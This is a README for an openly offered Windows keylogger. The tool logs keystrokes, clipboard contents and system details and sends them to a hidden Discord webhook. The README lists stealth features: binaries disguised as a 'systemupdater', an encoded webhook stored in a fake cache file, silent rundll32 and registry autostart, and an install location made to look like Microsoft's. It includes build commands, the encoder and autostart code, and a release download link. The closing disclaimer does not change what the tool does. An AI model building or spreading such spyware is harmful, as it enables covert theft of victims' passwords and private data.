# 🛡️ Keylogger – Installer-based Setup

A fully featured and installer-driven keylogger written in Python and C++.  
It captures keystrokes, clipboard changes, system information, and sends the data securely to a hidden Discord webhook.  
Includes a one-click installer, automatic webhook encoding, and stealth autostart via DLL and Task Scheduler.

---

## ✅ Features

- ⌨️ Logs all keystrokes with modifier support (e.g., `CTRL + C`)
- 📋 Detects clipboard changes and sends content in real time
- 💻 Collects system information (hostname, user, IPs, OS)
- 🔁 Sends data periodically via Discord webhook
- 🔒 Webhook hidden using Base64 encoding in a disguised config file
- 🧩 One-click setup via GUI installer
- 🎭 Stealth autostart using `update.dll` + Task Scheduler
- 🫥 Runs silently with no visible windows
- 🛠️ Compatible with both development and compiled environments

---

## 📦 Installer Structure (v1.0 Release)

| File / Folder                        | Description                                                                 |
| ----------------------------------- | --------------------------------------------------------------------------- |
| `installer.exe`                     | One-click installer GUI – encodes the webhook and sets up everything automatically            |
| `systemupdater.exe`                 | Keylogger binary (compiled from `systemupdater.py`)                         |
| `update.dll`                        | DLL that loads the keylogger at login using `rundll32.exe`                 |
| `cache.db`                          | Contains the encoded Discord webhook (Base64)                               |
| `README.txt`                        | Offline readme for users                                                    |
| `LICENSE.txt`                       | MIT License                                                                 |
| `Source_Code/installer.py`         | Python source for installer GUI                                             |
| `Source_Code/systemupdater.py`     | Main keylogger logic (keystrokes, clipboard, system info)                   |
| `Source_Code/Base64_webhook_encoder.py` | Optional CLI tool to encode webhook manually                         |
| `Source_Code/startloader.cpp`      | Source code for DLL that triggers the EXE                                   |
| `Source_Code/icon.ico`             | Optional icon used during EXE compilation                                               |

---

## ⚙️ Compilation Instructions

### 🧪 Keylogger Binary (systemupdater.exe)

```bash
pyinstaller --onefile --noconsole --icon="icon.ico" systemupdater.py
```

### 🧪 Installer Binary (installer.exe)

```bash
pyinstaller --onefile --console --icon="icon.ico" installer.py
```

### 🧪 DLL (update.dll)

```bash
g++ -shared -o update.dll startloader.cpp -Wl,--add-stdcall-alias
```

> The exported function **must** be named `MyFunction` for compatibility with `rundll32.exe`.

---

## 🔐 Webhook Handling

To hide the Discord webhook URL, it is encoded via Base64 and saved to `cache.db`.  
The installer does this automatically, or you can use the manual tool:

### Manual Encoder (Base64_webhook_encoder.py)

```python
import base64
import os
import sys
import msvcrt

webhook = input("Enter your Discord webhook URL: ").strip()
if not webhook.startswith("http"):
    print("❌ Invalid webhook URL!")
    print("Press any key to exit...")
    msvcrt.getch()
    sys.exit(1)

encoded = base64.b64encode(webhook.encode()).decode()
base_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
full_path = os.path.join(base_dir, "cache.db")

try:
    with open(full_path, "w", encoding="utf-8") as f:
        f.write(encoded)
    print(f"✅ Webhook saved to: {full_path}")
except Exception as e:
    print(f"❌ Failed to save: {e}")

print("Done. Press any key to close...")
msvcrt.getch()
```

---

## 🚀 Autostart via Registry Key

The DLL is silently triggered at each user logon.

### ▶ Add Startup Registry Key

```powershell
def setup_registry_autostart():
    dll_path = os.path.join(TARGET_DIR, DLL_NAME)
    rundll_command = f'rundll32.exe "{dll_path}",MyFunction'
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, rundll_command)
```

### ❌ Remove Startup Registry Key

```powershell
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater" -ErrorAction SilentlyContinue
```

---

## 🧠 How the Installer Works

1. **Run `installer.exe`**
   - Prompts for webhook
   - Encodes to `cache.db`

2. **Installs binaries** to:  
   `C:\ProgramData\Microsoft\CacheSync\`

3. **Registers Task Scheduler autostart**
   - Uses `rundll32.exe` to execute `update.dll` on logon

---

## 📥 Download

The latest compiled release (including EXE, DLL, full source code) is available here:  
🔗 [Latest Release →](https://github.com/mrpanda-bamboo/keylogger/releases/latest)

---

## 📜 License

This project is licensed under the **MIT License**.  
See the [LICENSE](./LICENSE) file for full terms.

---

## 🚨 Disclaimer

> This software is intended for **educational, research, and ethical testing purposes only**.  
> **Do not** use this tool on systems you do not own or have explicit permission to monitor.  
> Misuse of this software can violate privacy laws and may be considered illegal in many countries.  
> The author takes **no responsibility** for misuse or damage caused.

